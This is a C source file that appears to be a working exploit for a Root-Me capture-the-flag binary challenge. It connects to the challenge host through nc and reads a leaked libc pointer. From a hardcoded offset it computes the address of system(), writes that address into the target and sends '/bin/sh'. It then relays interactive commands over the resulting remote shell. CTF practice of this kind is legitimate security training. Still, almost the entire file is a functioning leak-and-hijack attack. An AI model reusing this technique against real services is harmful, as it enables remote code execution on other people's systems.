#include <sys/types.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>


#define OFFSET_400430_deref_system_local 0x37e550
#define OFFSET_400430_deref_system_remote 0x3790b0
#define SIZE_MAX 200
#define cmd "/bin/sh\n"


int analyse(char* s, char* res)
{
    char* sub = strstr(s, "[0]");
    if(!sub)
        return 0;

    sub += 4;
    if(sub[0] == 'x')
        return 0;

    int i=0;
    for(; sub[i] != ',' && sub[i+1] != ' '; i++)
        res[i] = sub[i];
    res[i] = 0;

    return 1;
}

int main()
{
    int child_to_parent[2];
    int parent_to_child[2];

    printf("%d\n", pipe(child_to_parent));
    printf("%d\n", pipe(parent_to_child));

    int id = fork();

    if(id < 0)
    {
        fprintf(stderr, "[-] Error during fork");
        return -1;
    }
    else if(!id)
    {
        close(child_to_parent[0]);
        close(parent_to_child[1]);

        dup2(parent_to_child[0], 0);
        dup2(child_to_parent[1], 1);

        close(child_to_parent[1]);
        close(parent_to_child[0]);

        //if(execl("ch44", "ch44", NULL) < 0)
        if(execl("/bin/nc", "/bin/nc", "challenge03.root-me.org", "56544", NULL) < 0)
        {
            fprintf(stderr, "[-] Error during execl");
            return -1;
        }

        return 0;
    }
    else
    {
        close(child_to_parent[1]);
        close(parent_to_child[0]);

        printf("[+] Waiting for child id %d\n", id);

        FILE* input = fopen("input", "rb");

        char buf[SIZE_MAX+1];
        while(fgets(buf, SIZE_MAX, input))
        {
            buf[strlen(buf)] = 0;
            printf("Got %s %d\n", buf, strlen(buf));
            write(parent_to_child[1], buf, strlen(buf));
            if(strlen(buf) <= 1)
                break;
            memset(buf, 0, SIZE_MAX);
        }

        char buf2[10000];
        char res[100];
        int a = 0;
        while((a=read(child_to_parent[0], buf2, 10000)) > 0)
        {
            printf("Obtained %d: %s\n", a, buf2);
            if(analyse(buf2, res))
            {
                printf("We got the leak ! %s\n", res);
                break;
            }
            memset(buf2, 0, 10000);
        }

        for(a=1; a<8; a++)
            if(!res[a-1])
                res[a] = 0;
        long long p = *((long long*)res);
        long long system_offset = OFFSET_400430_deref_system_remote;
        long long system_address = p-system_offset;
        printf("That corresponds to %lld\n", p);
        printf("So system is at %lld\n", system_address);

        printf("Switching ...\n");
        write(parent_to_child[1], "3\n", 2);
        write(parent_to_child[1], "3\n", 2);
        write(parent_to_child[1], (char*)&system_address, strlen((char*)&system_address));
        write(parent_to_child[1], "3333\n", 5);
        write(parent_to_child[1], "1\n", 2);
        write(parent_to_child[1], cmd, strlen(cmd));

        while(fgets(buf, SIZE_MAX, stdin))
        {
            buf[strlen(buf)] = 0;
            printf("Got %s %d\n", buf, strlen(buf));
            if(strlen(buf) <= 1)
                break;
            write(parent_to_child[1], buf, strlen(buf));
            a=read(child_to_parent[0], buf2, 10000);
            printf("Obtained %d: %s\n", a, buf2);
            memset(buf, 0, SIZE_MAX);
            memset(buf2, 0, 10000);
        }

        write(parent_to_child[1], "exit\n", 5);
        write(parent_to_child[1], "5\n", 2);

        printf("End writing\n");
        close(child_to_parent[0]);
        close(parent_to_child[1]);

        int status;
        waitpid(id, &status, 0);

        printf("[+] Ended with status %d\n", status);
    }
    return 0;
}
